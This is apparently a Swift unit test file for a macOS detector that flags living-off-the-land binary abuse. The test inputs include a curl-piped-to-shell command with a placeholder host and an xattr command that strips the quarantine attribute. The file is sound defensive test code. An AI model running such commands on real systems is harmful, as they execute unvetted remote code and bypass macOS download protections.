import XCTest
@testable import Nick

final class LOLBinExecutionPolicyTests: XCTestCase {
    func test_shortLivedCurlPipeIsClassifiedAtExec() throws {
        let finding = try XCTUnwrap(LOLBinExecutionPolicy.finding(
            executablePath: "/bin/sh",
            arguments: ["/bin/sh", "-c", "curl https://example.invalid/safe | /bin/sh"]
        ))
        XCTAssertEqual(finding.reason, "curl_pipe_shell")
        XCTAssertEqual(finding.severity, "critical")
        XCTAssertEqual(finding.title, "Download-to-shell command detected")
    }

    func test_safeCurlAndInteractiveShellAreNotClassified() {
        XCTAssertNil(LOLBinExecutionPolicy.finding(
            executablePath: "/usr/bin/curl",
            arguments: ["curl", "-I", "https://example.com"]
        ))
        XCTAssertNil(LOLBinExecutionPolicy.finding(
            executablePath: "/bin/zsh",
            arguments: ["zsh", "-l"]
        ))
    }

    func test_readOnlyXattrIsNotClassifiedButQuarantineRemovalIs() {
        XCTAssertNil(LOLBinExecutionPolicy.finding(
            executablePath: "/usr/bin/xattr",
            arguments: ["xattr", "-p", "com.apple.quarantine", "/tmp/item"]
        ))
        XCTAssertEqual(
            LOLBinExecutionPolicy.finding(
                executablePath: "/usr/bin/xattr",
                arguments: ["xattr", "-d", "com.apple.quarantine", "/tmp/item"]
            )?.reason,
            "quarantine_removal"
        )
    }
}
